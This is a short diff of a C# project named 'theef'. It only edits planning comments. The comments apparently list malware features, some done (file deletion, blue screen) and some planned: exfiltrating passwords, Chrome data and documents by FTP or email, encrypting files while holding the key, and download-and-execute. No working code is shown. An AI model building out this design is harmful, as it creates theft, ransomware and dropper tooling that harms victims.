@@ -11,26 +11,34 @@ namespace theef
     {
         static void Main(string[] args)
         {
-            /* Theef feature:
-             * DONE - Message Box
-             * - Blue screen
+            /* Done:
+             * - (bad) config file
+             * - Message box
+             * - Delete file
+             * - bsod
+             */
+
+            /* TODO features:
              * - Quick Auto Remote Backup (Passwords, Chrome, Documents, Pictures)
              *      - "Smart" backup, checks file types/size to ensure files are not too big
              *      - FTP
              *      - Email
-             * DONE - File delete
+             * 
              * - File encryptor/decryptor (documents, pictures, ...)
              *      - Store private key somewhere safe.
+             * 
              * - Download and execute/open file(s)
+             *      - Delay
+             *      - Directory to download to
+             *      - Download to memory?
              */
-
-            // TODO: bellow
-            /*
+             
+            /* TODO Functionality:
              *  - Multi threading
              *  - Module based features
              *  - Frontend for making the config file.
              *  - Change config format so it is not terrible. Json?
-             *  - Change config format so if you don't want something enabled you just don't include it.
+             *  - Change config parser so if you don't want something enabled you just don't include it.
              */
 
             // Load the parts array into the settings class.
